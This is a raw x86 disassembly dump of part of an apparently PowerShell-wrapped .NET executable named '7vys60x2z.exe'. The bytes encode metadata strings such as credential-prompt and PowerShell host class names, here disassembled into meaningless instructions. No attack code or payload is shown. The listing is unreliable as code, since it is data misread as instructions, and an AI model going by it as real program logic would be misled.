  40683a:	3d 00 02 00 6f       	cmp    $0x6f000200,%eax
  40683f:	00 3d 00 02 00 71    	add    %bh,0x71000200
  406845:	00 3f                	add    %bh,(%edi)
  406847:	00 01                	add    %al,(%ecx)
  406849:	00 72 00             	add    %dh,0x0(%edx)
  40684c:	3f                   	aas
  40684d:	00 02                	add    %al,(%edx)
  40684f:	00 73 00             	add    %dh,0x0(%ebx)
  406852:	41                   	inc    %ecx
  406853:	00 01                	add    %al,(%ecx)
  406855:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  406859:	00 02                	add    %al,(%edx)
  40685b:	00 75 00             	add    %dh,0x0(%ebp)
  40685e:	43                   	inc    %ebx
  40685f:	00 01                	add    %al,(%ecx)
  406861:	00 76 00             	add    %dh,0x0(%esi)
  406864:	43                   	inc    %ebx
  406865:	00 44 14 7d          	add    %al,0x7d(%esp,%edx,1)
  406869:	15 37 1c 26 03       	adc    $0x3261c37,%eax
  40686e:	08 04 19             	or     %al,(%ecx,%ebx,1)
  406871:	04 ab                	add    $0xab,%al
  406873:	04 41                	add    $0x41,%al
  406875:	05 49 05 51 05       	add    $0x5510549,%eax
  40687a:	95                   	xchg   %eax,%ebp
  40687b:	06                   	push   %es
  40687c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40687d:	06                   	push   %es
  40687e:	e0 06                	loopne 0x406886
  406880:	f5                   	cmc
  406881:	06                   	push   %es
  406882:	04 01                	add    $0x1,%al
  406884:	03 00                	add    (%eax),%eax
  406886:	f6 01 01             	testb  $0x1,(%ecx)
  406889:	00 04 02             	add    %al,(%edx,%eax,1)
  40688c:	3f                   	aas
  40688d:	00 45 07             	add    %al,0x7(%ebp)
  406890:	02 00                	add    (%eax),%al
  406892:	00 01                	add    %al,(%ecx)
  406894:	4b                   	dec    %ebx
  406895:	00 a2 07 02 00 00    	add    %ah,0x207(%edx)
  40689b:	01 69 00             	add    %ebp,0x0(%ecx)
  40689e:	6e                   	outsb  %ds:(%esi),(%dx)
  40689f:	09 03                	or     %eax,(%ebx)
  4068a1:	00 00                	add    %al,(%eax)
  4068a3:	01 6b 00             	add    %ebp,0x0(%ebx)
  4068a6:	7b 09                	jnp    0x4068b1
  4068a8:	03 00                	add    (%eax),%eax
  4068aa:	04 80                	add    $0x80,%al
  4068ac:	00 00                	add    %al,(%eax)
  4068ae:	02 00                	add    (%eax),%al
  4068b0:	00 00                	add    %al,(%eax)
  4068b2:	5b                   	pop    %ebx
	...
  4068bb:	00 27                	add    %ah,(%edi)
  4068bd:	14 00                	adc    $0x0,%al
  4068bf:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4068ca:	00 00                	add    %al,(%eax)
  4068cc:	01 00                	add    %eax,(%eax)
  4068ce:	2b 01                	sub    (%ecx),%eax
  4068d0:	00 00                	add    %al,(%eax)
  4068d2:	00 00                	add    %al,(%eax)
  4068d4:	03 00                	add    (%eax),%eax
	...
  4068de:	00 00                	add    %al,(%eax)
  4068e0:	0a 00                	or     (%eax),%al
  4068e2:	51                   	push   %ecx
  4068e3:	01 00                	add    %eax,(%eax)
  4068e5:	00 00                	add    %al,(%eax)
  4068e7:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4068f2:	00 00                	add    %al,(%eax)
  4068f4:	01 00                	add    %eax,(%eax)
  4068f6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4068f7:	01 00                	add    %eax,(%eax)
  4068f9:	00 00                	add    %al,(%eax)
  4068fb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406906:	00 00                	add    %al,(%eax)
  406908:	01 00                	add    %eax,(%eax)
  40690a:	34 01                	xor    $0x1,%al
  40690c:	00 00                	add    %al,(%eax)
  40690e:	00 00                	add    %al,(%eax)
  406910:	04 00                	add    $0x0,%al
	...
  40691a:	00 00                	add    %al,(%eax)
  40691c:	b2 01                	mov    $0x1,%dl
  40691e:	85 08                	test   %ecx,(%eax)
	...
  406928:	01 00                	add    %eax,(%eax)
  40692a:	00 00                	add    %al,(%eax)
  40692c:	9a 22 00 00 03 00 02 	lcall  $0x200,$0x3000022
  406933:	00 04 00             	add    %al,(%eax,%eax,1)
  406936:	02 00                	add    (%eax),%al
  406938:	05 00 02 00 06       	add    $0x6000200,%eax
  40693d:	00 02                	add    %al,(%edx)
  40693f:	00 0b                	add    %cl,(%ebx)
  406941:	00 0a                	add    %cl,(%edx)
  406943:	00 0d 00 0c 00 0f    	add    %cl,0xf000c00
  406949:	00 0e                	add    %cl,(%esi)
  40694b:	00 10                	add    %dl,(%eax)
  40694d:	00 0e                	add    %cl,(%esi)
  40694f:	00 13                	add    %dl,(%ebx)
  406951:	00 12                	add    %dl,(%edx)
  406953:	00 16                	add    %dl,(%esi)
  406955:	00 15 00 21 00 ff    	add    %dl,0xff002100
  40695b:	02 2f                	add    (%edi),%ch
  40695d:	02 97 07 00 00 00    	add    0x7(%edi),%dl
  406963:	00 00                	add    %al,(%eax)
  406965:	3c 4d                	cmp    $0x4d,%al
  406967:	6f                   	outsl  %ds:(%esi),(%dx)
  406968:	64 75 6c             	fs jne 0x4069d7
  40696b:	65 3e 00 37          	gs add %dh,%ds:(%edi)
  40696f:	76 79                	jbe    0x4069ea
  406971:	73 36                	jae    0x4069a9
  406973:	30 78 32             	xor    %bh,0x32(%eax)
  406976:	7a 2e                	jp     0x4069a6
  406978:	65 78 65             	gs js  0x4069e0
  40697b:	00 43 72             	add    %al,0x72(%ebx)
  40697e:	65 64 65 6e          	gs fs outsb %gs:(%esi),(%dx)
  406982:	74 69                	je     0x4069ed
  406984:	61                   	popa
  406985:	6c                   	insb   (%dx),%es:(%edi)
  406986:	5f                   	pop    %edi
  406987:	46                   	inc    %esi
  406988:	6f                   	outsl  %ds:(%esi),(%dx)
  406989:	72 6d                	jb     0x4069f8
  40698b:	00 4d 6f             	add    %cl,0x6f(%ebp)
  40698e:	64 75 6c             	fs jne 0x4069fd
  406991:	65 4e                	gs dec %esi
  406993:	61                   	popa
  406994:	6d                   	insl   (%dx),%es:(%edi)
  406995:	65 53                	gs push %ebx
  406997:	70 61                	jo     0x4069fa
  406999:	63 65 00             	arpl   %esp,0x0(%ebp)
  40699c:	43                   	inc    %ebx
  40699d:	52                   	push   %edx
  40699e:	45                   	inc    %ebp
  40699f:	44                   	inc    %esp
  4069a0:	55                   	push   %ebp
  4069a1:	49                   	dec    %ecx
  4069a2:	5f                   	pop    %edi
  4069a3:	49                   	dec    %ecx
  4069a4:	4e                   	dec    %esi
  4069a5:	46                   	inc    %esi
  4069a6:	4f                   	dec    %edi
  4069a7:	00 43 52             	add    %al,0x52(%ebx)
  4069aa:	45                   	inc    %ebp
  4069ab:	44                   	inc    %esp
  4069ac:	55                   	push   %ebp
  4069ad:	49                   	dec    %ecx
  4069ae:	5f                   	pop    %edi
  4069af:	46                   	inc    %esi
  4069b0:	4c                   	dec    %esp
  4069b1:	41                   	inc    %ecx
  4069b2:	47                   	inc    %edi
  4069b3:	53                   	push   %ebx
  4069b4:	00 43 72             	add    %al,0x72(%ebx)
  4069b7:	65 64 55             	gs fs push %ebp
  4069ba:	49                   	dec    %ecx
  4069bb:	5f                   	pop    %edi
  4069bc:	52                   	push   %edx
  4069bd:	65 74 75             	gs je  0x406a35
  4069c0:	72 6e                	jb     0x406a30
  4069c2:	43                   	inc    %ebx
  4069c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4069c4:	64 65 73 00          	fs gs jae 0x4069c8
  4069c8:	55                   	push   %ebp
  4069c9:	73 65                	jae    0x406a30
  4069cb:	72 5f                	jb     0x406a2c
  4069cd:	50                   	push   %eax
  4069ce:	77 64                	ja     0x406a34
  4069d0:	00 4d 61             	add    %cl,0x61(%ebp)
  4069d3:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  4069da:	65 52                	gs push %edx
  4069dc:	61                   	popa
  4069dd:	77 55                	ja     0x406a34
  4069df:	49                   	dec    %ecx
  4069e0:	00 49 6e             	add    %cl,0x6e(%ecx)
  4069e3:	70 75                	jo     0x406a5a
  4069e5:	74 5f                	je     0x406a46
  4069e7:	42                   	inc    %edx
  4069e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4069e9:	78 00                	js     0x4069eb
  4069eb:	43                   	inc    %ebx
  4069ec:	68 6f 69 63 65       	push   $0x6563696f
  4069f1:	5f                   	pop    %edi
  4069f2:	42                   	inc    %edx
  4069f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4069f4:	78 00                	js     0x4069f6
  4069f6:	52                   	push   %edx
  4069f7:	65 61                	gs popa
  4069f9:	64 4b                	fs dec %ebx
  4069fb:	65 79 5f             	gs jns 0x406a5d
  4069fe:	42                   	inc    %edx
  4069ff:	6f                   	outsl  %ds:(%esi),(%dx)
  406a00:	78 00                	js     0x406a02
  406a02:	4b                   	dec    %ebx
  406a03:	65 79 62             	gs jns 0x406a68
  406a06:	6f                   	outsl  %ds:(%esi),(%dx)
  406a07:	61                   	popa
  406a08:	72 64                	jb     0x406a6e
  406a0a:	5f                   	pop    %edi
  406a0b:	46                   	inc    %esi
  406a0c:	6f                   	outsl  %ds:(%esi),(%dx)
  406a0d:	72 6d                	jb     0x406a7c
  406a0f:	00 50 72             	add    %dl,0x72(%eax)
  406a12:	6f                   	outsl  %ds:(%esi),(%dx)
  406a13:	67 72 65             	addr16 jb 0x406a7b
  406a16:	73 73                	jae    0x406a8b
  406a18:	5f                   	pop    %edi
  406a19:	46                   	inc    %esi
  406a1a:	6f                   	outsl  %ds:(%esi),(%dx)
  406a1b:	72 6d                	jb     0x406a8a
  406a1d:	00 50 72             	add    %dl,0x72(%eax)
  406a20:	6f                   	outsl  %ds:(%esi),(%dx)
  406a21:	67 72 65             	addr16 jb 0x406a89
  406a24:	73 73                	jae    0x406a99
  406a26:	5f                   	pop    %edi
  406a27:	44                   	inc    %esp
  406a28:	61                   	popa
  406a29:	74 61                	je     0x406a8c
  406a2b:	00 43 6f             	add    %al,0x6f(%ebx)
  406a2e:	6e                   	outsb  %ds:(%esi),(%dx)
  406a2f:	73 6f                	jae    0x406aa0
  406a31:	6c                   	insb   (%dx),%es:(%edi)
  406a32:	65 5f                	gs pop %edi
  406a34:	49                   	dec    %ecx
  406a35:	6e                   	outsb  %ds:(%esi),(%dx)
  406a36:	66 6f                	outsw  %ds:(%esi),(%dx)
  406a38:	00 46 69             	add    %al,0x69(%esi)
  406a3b:	6c                   	insb   (%dx),%es:(%edi)
  406a3c:	65 54                	gs push %esp
  406a3e:	79 70                	jns    0x406ab0
  406a40:	65 00 53 54          	add    %dl,%gs:0x54(%ebx)
  406a44:	44                   	inc    %esp
  406a45:	48                   	dec    %eax
  406a46:	61                   	popa
  406a47:	6e                   	outsb  %ds:(%esi),(%dx)
  406a48:	64 6c                	fs insb (%dx),%es:(%edi)
  406a4a:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  406a4e:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  406a55:	65 55                	gs push %ebp
  406a57:	49                   	dec    %ecx
  406a58:	00 4d 61             	add    %cl,0x61(%ebp)
  406a5b:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  406a62:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  406a66:	6e                   	outsb  %ds:(%esi),(%dx)
  406a67:	73 6f                	jae    0x406ad8
  406a69:	6c                   	insb   (%dx),%es:(%edi)
  406a6a:	65 43                	gs inc %ebx
  406a6c:	6f                   	outsl  %ds:(%esi),(%dx)
  406a6d:	6c                   	insb   (%dx),%es:(%edi)
  406a6e:	6f                   	outsl  %ds:(%esi),(%dx)
  406a6f:	72 50                	jb     0x406ac1
  406a71:	72 6f                	jb     0x406ae2
  406a73:	78 79                	js     0x406aee
  406a75:	00 4d 61             	add    %cl,0x61(%ebp)
  406a78:	69 6e 41 70 70 49 6e 	imul   $0x6e497070,0x41(%esi),%ebp
  406a7f:	74 65                	je     0x406ae6
  406a81:	72 66                	jb     0x406ae9
  406a83:	61                   	popa
  406a84:	63 65 00             	arpl   %esp,0x0(%ebp)
  406a87:	4d                   	dec    %ebp
  406a88:	61                   	popa
  406a89:	69 6e 41 70 70 00 6d 	imul   $0x6d007070,0x41(%esi),%ebp
  406a90:	73 63                	jae    0x406af5
  406a92:	6f                   	outsl  %ds:(%esi),(%dx)
  406a93:	72 6c                	jb     0x406b01
  406a95:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  406a9c:	65 6d                	gs insl (%dx),%es:(%edi)
  406a9e:	00 4f 62             	add    %cl,0x62(%edi)
  406aa1:	6a 65                	push   $0x65
  406aa3:	63 74 00 56          	arpl   %esi,0x56(%eax,%eax,1)
  406aa7:	61                   	popa
  406aa8:	6c                   	insb   (%dx),%es:(%edi)
  406aa9:	75 65                	jne    0x406b10
  406aab:	54                   	push   %esp
  406aac:	79 70                	jns    0x406b1e
  406aae:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
  406ab2:	75 6d                	jne    0x406b21
  406ab4:	00 53 79             	add    %dl,0x79(%ebx)
  406ab7:	73 74                	jae    0x406b2d
  406ab9:	65 6d                	gs insl (%dx),%es:(%edi)
  406abb:	2e 4d                	cs dec %ebp
  406abd:	61                   	popa
  406abe:	6e                   	outsb  %ds:(%esi),(%dx)
  406abf:	61                   	popa
  406ac0:	67 65 6d             	gs insl (%dx),%es:(%di)
  406ac3:	65 6e                	outsb  %gs:(%esi),(%dx)
  406ac5:	74 2e                	je     0x406af5
  406ac7:	41                   	inc    %ecx
  406ac8:	75 74                	jne    0x406b3e
  406aca:	6f                   	outsl  %ds:(%esi),(%dx)
  406acb:	6d                   	insl   (%dx),%es:(%edi)
  406acc:	61                   	popa
  406acd:	74 69                	je     0x406b38
  406acf:	6f                   	outsl  %ds:(%esi),(%dx)
  406ad0:	6e                   	outsb  %ds:(%esi),(%dx)
  406ad1:	00 53 79             	add    %dl,0x79(%ebx)
  406ad4:	73 74                	jae    0x406b4a
  406ad6:	65 6d                	gs insl (%dx),%es:(%edi)
  406ad8:	2e 4d                	cs dec %ebp
  406ada:	61                   	popa
  406adb:	6e                   	outsb  %ds:(%esi),(%dx)
  406adc:	61                   	popa
  406add:	67 65 6d             	gs insl (%dx),%es:(%di)
  406ae0:	65 6e                	outsb  %gs:(%esi),(%dx)
  406ae2:	74 2e                	je     0x406b12
  406ae4:	41                   	inc    %ecx
  406ae5:	75 74                	jne    0x406b5b
  406ae7:	6f                   	outsl  %ds:(%esi),(%dx)
  406ae8:	6d                   	insl   (%dx),%es:(%edi)
  406ae9:	61                   	popa
  406aea:	74 69                	je     0x406b55
  406aec:	6f                   	outsl  %ds:(%esi),(%dx)
  406aed:	6e                   	outsb  %ds:(%esi),(%dx)
  406aee:	2e 48                	cs dec %eax
  406af0:	6f                   	outsl  %ds:(%esi),(%dx)
  406af1:	73 74                	jae    0x406b67
  406af3:	00 50 53             	add    %dl,0x53(%eax)
  406af6:	48                   	dec    %eax
  406af7:	6f                   	outsl  %ds:(%esi),(%dx)
  406af8:	73 74                	jae    0x406b6e
  406afa:	52                   	push   %edx
  406afb:	61                   	popa
  406afc:	77 55                	ja     0x406b53
  406afe:	73 65                	jae    0x406b65
  406b00:	72 49                	jb     0x406b4b
  406b02:	6e                   	outsb  %ds:(%esi),(%dx)
  406b03:	74 65                	je     0x406b6a
  406b05:	72 66                	jb     0x406b6d
  406b07:	61                   	popa
  406b08:	63 65 00             	arpl   %esp,0x0(%ebp)
  406b0b:	53                   	push   %ebx
  406b0c:	79 73                	jns    0x406b81
  406b0e:	74 65                	je     0x406b75
  406b10:	6d                   	insl   (%dx),%es:(%edi)
  406b11:	2e 57                	cs push %edi
  406b13:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  406b1a:	46                   	inc    %esi
  406b1b:	6f                   	outsl  %ds:(%esi),(%dx)
  406b1c:	72 6d                	jb     0x406b8b
  406b1e:	73 00                	jae    0x406b20
  406b20:	46                   	inc    %esi
  406b21:	6f                   	outsl  %ds:(%esi),(%dx)
  406b22:	72 6d                	jb     0x406b91
  406b24:	00 50 53             	add    %dl,0x53(%eax)
  406b27:	48                   	dec    %eax
  406b28:	6f                   	outsl  %ds:(%esi),(%dx)
  406b29:	73 74                	jae    0x406b9f
  406b2b:	55                   	push   %ebp
  406b2c:	73 65                	jae    0x406b93
  406b2e:	72 49                	jb     0x406b79
  406b30:	6e                   	outsb  %ds:(%esi),(%dx)
  406b31:	74 65                	je     0x406b98
  406b33:	72 66                	jb     0x406b9b
  406b35:	61                   	popa
  406b36:	63 65 00             	arpl   %esp,0x0(%ebp)
  406b39:	50                   	push   %eax
  406b3a:	53                   	push   %ebx
  406b3b:	48                   	dec    %eax
  406b3c:	6f                   	outsl  %ds:(%esi),(%dx)
  406b3d:	73 74                	jae    0x406bb3
  406b3f:	00 53 79             	add    %dl,0x79(%ebx)
  406b42:	73 74                	jae    0x406bb8
  406b44:	65 6d                	gs insl (%dx),%es:(%edi)
  406b46:	2e 54                	cs push %esp
  406b48:	65 78 74             	gs js  0x406bbf
  406b4b:	00 53 74             	add    %dl,0x74(%ebx)
  406b4e:	72 69                	jb     0x406bb9
  406b50:	6e                   	outsb  %ds:(%esi),(%dx)
  406b51:	67 42                	addr16 inc %edx
  406b53:	75 69                	jne    0x406bbe
  406b55:	6c                   	insb   (%dx),%es:(%edi)
  406b56:	64 65 72 00          	fs gs jb 0x406b5a
  406b5a:	43                   	inc    %ebx
  406b5b:	72 65                	jb     0x406bc2
  406b5d:	64 55                	fs push %ebp
  406b5f:	49                   	dec    %ecx
  406b60:	50                   	push   %eax
  406b61:	72 6f                	jb     0x406bd2
  406b63:	6d                   	insl   (%dx),%es:(%edi)
  406b64:	70 74                	jo     0x406bda
  406b66:	46                   	inc    %esi
  406b67:	6f                   	outsl  %ds:(%esi),(%dx)
  406b68:	72 43                	jb     0x406bad
  406b6a:	72 65                	jb     0x406bd1
  406b6c:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406b6f:	74 69                	je     0x406bda
  406b71:	61                   	popa
  406b72:	6c                   	insb   (%dx),%es:(%edi)
  406b73:	73 00                	jae    0x406b75
  406b75:	50                   	push   %eax
  406b76:	53                   	push   %ebx
  406b77:	43                   	inc    %ebx
  406b78:	72 65                	jb     0x406bdf
  406b7a:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406b7d:	74 69                	je     0x406be8
  406b7f:	61                   	popa
  406b80:	6c                   	insb   (%dx),%es:(%edi)
  406b81:	54                   	push   %esp
  406b82:	79 70                	jns    0x406bf4
  406b84:	65 73 00             	gs jae 0x406b87
  406b87:	50                   	push   %eax
  406b88:	53                   	push   %ebx
  406b89:	43                   	inc    %ebx
  406b8a:	72 65                	jb     0x406bf1
  406b8c:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406b8f:	74 69                	je     0x406bfa
  406b91:	61                   	popa
  406b92:	6c                   	insb   (%dx),%es:(%edi)
  406b93:	55                   	push   %ebp
  406b94:	49                   	dec    %ecx
  406b95:	4f                   	dec    %edi
  406b96:	70 74                	jo     0x406c0c
  406b98:	69 6f 6e 73 00 50 72 	imul   $0x72500073,0x6e(%edi),%ebp
  406b9f:	6f                   	outsl  %ds:(%esi),(%dx)
  406ba0:	6d                   	insl   (%dx),%es:(%edi)
  406ba1:	70 74                	jo     0x406c17
  406ba3:	46                   	inc    %esi
  406ba4:	6f                   	outsl  %ds:(%esi),(%dx)
  406ba5:	72 50                	jb     0x406bf7
  406ba7:	61                   	popa
  406ba8:	73 73                	jae    0x406c1d
  406baa:	77 6f                	ja     0x406c1b
  406bac:	72 64                	jb     0x406c12
  406bae:	00 2e                	add    %ch,(%esi)
  406bb0:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  406bb4:	00 63 62             	add    %ah,0x62(%ebx)
  406bb7:	53                   	push   %ebx
  406bb8:	69 7a 65 00 68 77 6e 	imul   $0x6e776800,0x65(%edx),%edi
  406bbf:	64 50                	fs push %eax
  406bc1:	61                   	popa
  406bc2:	72 65                	jb     0x406c29
  406bc4:	6e                   	outsb  %ds:(%esi),(%dx)
  406bc5:	74 00                	je     0x406bc7
  406bc7:	70 73                	jo     0x406c3c
  406bc9:	7a 4d                	jp     0x406c18
  406bcb:	65 73 73             	gs jae 0x406c41
  406bce:	61                   	popa
  406bcf:	67 65 54             	addr16 gs push %esp
  406bd2:	65 78 74             	gs js  0x406c49
  406bd5:	00 70 73             	add    %dh,0x73(%eax)
  406bd8:	7a 43                	jp     0x406c1d
  406bda:	61                   	popa
  406bdb:	70 74                	jo     0x406c51
  406bdd:	69 6f 6e 54 65 78 74 	imul   $0x74786554,0x6e(%edi),%ebp
  406be4:	00 68 62             	add    %ch,0x62(%eax)
  406be7:	6d                   	insl   (%dx),%es:(%edi)
  406be8:	42                   	inc    %edx
  406be9:	61                   	popa
  406bea:	6e                   	outsb  %ds:(%esi),(%dx)
  406beb:	6e                   	outsb  %ds:(%esi),(%dx)
  406bec:	65 72 00             	gs jb  0x406bef
  406bef:	76 61                	jbe    0x406c52
  406bf1:	6c                   	insb   (%dx),%es:(%edi)
  406bf2:	75 65                	jne    0x406c59
  406bf4:	5f                   	pop    %edi
  406bf5:	5f                   	pop    %edi
  406bf6:	00 49 4e             	add    %cl,0x4e(%ecx)
  406bf9:	43                   	inc    %ebx
  406bfa:	4f                   	dec    %edi
  406bfb:	52                   	push   %edx
  406bfc:	52                   	push   %edx
  406bfd:	45                   	inc    %ebp
  406bfe:	43                   	inc    %ebx
  406bff:	54                   	push   %esp
  406c00:	5f                   	pop    %edi
  406c01:	50                   	push   %eax
  406c02:	41                   	inc    %ecx
  406c03:	53                   	push   %ebx
  406c04:	53                   	push   %ebx
  406c05:	57                   	push   %edi
  406c06:	4f                   	dec    %edi
  406c07:	52                   	push   %edx
  406c08:	44                   	inc    %esp
  406c09:	00 44 4f 5f          	add    %al,0x5f(%edi,%ecx,2)
  406c0d:	4e                   	dec    %esi
  406c0e:	4f                   	dec    %edi
  406c0f:	54                   	push   %esp
  406c10:	5f                   	pop    %edi
  406c11:	50                   	push   %eax
  406c12:	45                   	inc    %ebp
  406c13:	52                   	push   %edx
  406c14:	53                   	push   %ebx
  406c15:	49                   	dec    %ecx
  406c16:	53                   	push   %ebx
  406c17:	54                   	push   %esp
  406c18:	00 52 45             	add    %dl,0x45(%edx)
  406c1b:	51                   	push   %ecx
  406c1c:	55                   	push   %ebp
  406c1d:	45                   	inc    %ebp
  406c1e:	53                   	push   %ebx
  406c1f:	54                   	push   %esp
  406c20:	5f                   	pop    %edi
  406c21:	41                   	inc    %ecx
  406c22:	44                   	inc    %esp
  406c23:	4d                   	dec    %ebp
  406c24:	49                   	dec    %ecx
  406c25:	4e                   	dec    %esi
  406c26:	49                   	dec    %ecx
  406c27:	53                   	push   %ebx
  406c28:	54                   	push   %esp
  406c29:	52                   	push   %edx
  406c2a:	41                   	inc    %ecx
  406c2b:	54                   	push   %esp
  406c2c:	4f                   	dec    %edi
  406c2d:	52                   	push   %edx
  406c2e:	00 45 58             	add    %al,0x58(%ebp)
  406c31:	43                   	inc    %ebx
  406c32:	4c                   	dec    %esp
  406c33:	55                   	push   %ebp
  406c34:	44                   	inc    %esp
  406c35:	45                   	inc    %ebp
  406c36:	5f                   	pop    %edi
  406c37:	43                   	inc    %ebx
  406c38:	45                   	inc    %ebp
  406c39:	52                   	push   %edx
  406c3a:	54                   	push   %esp
  406c3b:	49                   	dec    %ecx
  406c3c:	46                   	inc    %esi
  406c3d:	49                   	dec    %ecx
  406c3e:	43                   	inc    %ebx
  406c3f:	41                   	inc    %ecx
  406c40:	54                   	push   %esp
  406c41:	45                   	inc    %ebp
  406c42:	53                   	push   %ebx
  406c43:	00 52 45             	add    %dl,0x45(%edx)
  406c46:	51                   	push   %ecx
  406c47:	55                   	push   %ebp
  406c48:	49                   	dec    %ecx
  406c49:	52                   	push   %edx
  406c4a:	45                   	inc    %ebp
  406c4b:	5f                   	pop    %edi
  406c4c:	43                   	inc    %ebx
  406c4d:	45                   	inc    %ebp
  406c4e:	52                   	push   %edx
  406c4f:	54                   	push   %esp
  406c50:	49                   	dec    %ecx
  406c51:	46                   	inc    %esi
  406c52:	49                   	dec    %ecx
  406c53:	43                   	inc    %ebx
  406c54:	41                   	inc    %ecx
  406c55:	54                   	push   %esp
  406c56:	45                   	inc    %ebp
  406c57:	00 53 48             	add    %dl,0x48(%ebx)
  406c5a:	4f                   	dec    %edi
  406c5b:	57                   	push   %edi
  406c5c:	5f                   	pop    %edi
  406c5d:	53                   	push   %ebx
  406c5e:	41                   	inc    %ecx
  406c5f:	56                   	push   %esi
  406c60:	45                   	inc    %ebp
  406c61:	5f                   	pop    %edi
  406c62:	43                   	inc    %ebx
  406c63:	48                   	dec    %eax
  406c64:	45                   	inc    %ebp
  406c65:	43                   	inc    %ebx
  406c66:	4b                   	dec    %ebx
  406c67:	5f                   	pop    %edi
  406c68:	42                   	inc    %edx
  406c69:	4f                   	dec    %edi
  406c6a:	58                   	pop    %eax
  406c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  406c6e:	57                   	push   %edi
  406c6f:	41                   	inc    %ecx
  406c70:	59                   	pop    %ecx
  406c71:	53                   	push   %ebx
  406c72:	5f                   	pop    %edi
  406c73:	53                   	push   %ebx
  406c74:	48                   	dec    %eax
  406c75:	4f                   	dec    %edi
  406c76:	57                   	push   %edi
  406c77:	5f                   	pop    %edi
  406c78:	55                   	push   %ebp
  406c79:	49                   	dec    %ecx
  406c7a:	00 52 45             	add    %dl,0x45(%edx)
  406c7d:	51                   	push   %ecx
  406c7e:	55                   	push   %ebp
  406c7f:	49                   	dec    %ecx
  406c80:	52                   	push   %edx
  406c81:	45                   	inc    %ebp
  406c82:	5f                   	pop    %edi
  406c83:	53                   	push   %ebx
  406c84:	4d                   	dec    %ebp
  406c85:	41                   	inc    %ecx
  406c86:	52                   	push   %edx
  406c87:	54                   	push   %esp
  406c88:	43                   	inc    %ebx
  406c89:	41                   	inc    %ecx
  406c8a:	52                   	push   %edx
  406c8b:	44                   	inc    %esp
  406c8c:	00 50 41             	add    %dl,0x41(%eax)
  406c8f:	53                   	push   %ebx
  406c90:	53                   	push   %ebx
  406c91:	57                   	push   %edi
  406c92:	4f                   	dec    %edi
  406c93:	52                   	push   %edx
  406c94:	44                   	inc    %esp
  406c95:	5f                   	pop    %edi
  406c96:	4f                   	dec    %edi
  406c97:	4e                   	dec    %esi
  406c98:	4c                   	dec    %esp
  406c99:	59                   	pop    %ecx
  406c9a:	5f                   	pop    %edi
  406c9b:	4f                   	dec    %edi
  406c9c:	4b                   	dec    %ebx
  406c9d:	00 56 41             	add    %dl,0x41(%esi)
  406ca0:	4c                   	dec    %esp
  406ca1:	49                   	dec    %ecx
  406ca2:	44                   	inc    %esp
  406ca3:	41                   	inc    %ecx
  406ca4:	54                   	push   %esp
  406ca5:	45                   	inc    %ebp
  406ca6:	5f                   	pop    %edi
  406ca7:	55                   	push   %ebp
  406ca8:	53                   	push   %ebx
  406ca9:	45                   	inc    %ebp
  406caa:	52                   	push   %edx
  406cab:	4e                   	dec    %esi
  406cac:	41                   	inc    %ecx
  406cad:	4d                   	dec    %ebp
  406cae:	45                   	inc    %ebp
  406caf:	00 43 4f             	add    %al,0x4f(%ebx)
  406cb2:	4d                   	dec    %ebp
  406cb3:	50                   	push   %eax
  406cb4:	4c                   	dec    %esp
  406cb5:	45                   	inc    %ebp
  406cb6:	54                   	push   %esp
  406cb7:	45                   	inc    %ebp
  406cb8:	5f                   	pop    %edi
  406cb9:	55                   	push   %ebp
  406cba:	53                   	push   %ebx
  406cbb:	45                   	inc    %ebp
  406cbc:	52                   	push   %edx
  406cbd:	4e                   	dec    %esi
  406cbe:	41                   	inc    %ecx
  406cbf:	4d                   	dec    %ebp
  406cc0:	45                   	inc    %ebp
  406cc1:	00 50 45             	add    %dl,0x45(%eax)
  406cc4:	52                   	push   %edx
  406cc5:	53                   	push   %ebx
  406cc6:	49                   	dec    %ecx
  406cc7:	53                   	push   %ebx
  406cc8:	54                   	push   %esp
  406cc9:	00 53 45             	add    %dl,0x45(%ebx)
  406ccc:	52                   	push   %edx
  406ccd:	56                   	push   %esi
  406cce:	45                   	inc    %ebp
  406ccf:	52                   	push   %edx
  406cd0:	5f                   	pop    %edi
  406cd1:	43                   	inc    %ebx
  406cd2:	52                   	push   %edx
  406cd3:	45                   	inc    %ebp
  406cd4:	44                   	inc    %esp
  406cd5:	45                   	inc    %ebp
  406cd6:	4e                   	dec    %esi
  406cd7:	54                   	push   %esp
  406cd8:	49                   	dec    %ecx
  406cd9:	41                   	inc    %ecx
  406cda:	4c                   	dec    %esp
  406cdb:	00 45 58             	add    %al,0x58(%ebp)
  406cde:	50                   	push   %eax
  406cdf:	45                   	inc    %ebp
  406ce0:	43                   	inc    %ebx
  406ce1:	54                   	push   %esp
  406ce2:	5f                   	pop    %edi
  406ce3:	43                   	inc    %ebx
  406ce4:	4f                   	dec    %edi
  406ce5:	4e                   	dec    %esi
  406ce6:	46                   	inc    %esi
  406ce7:	49                   	dec    %ecx
  406ce8:	52                   	push   %edx
  406ce9:	4d                   	dec    %ebp
  406cea:	41                   	inc    %ecx
  406ceb:	54                   	push   %esp
  406cec:	49                   	dec    %ecx
  406ced:	4f                   	dec    %edi
  406cee:	4e                   	dec    %esi
  406cef:	00 47 45             	add    %al,0x45(%edi)
  406cf2:	4e                   	dec    %esi
  406cf3:	45                   	inc    %ebp
  406cf4:	52                   	push   %edx
  406cf5:	49                   	dec    %ecx
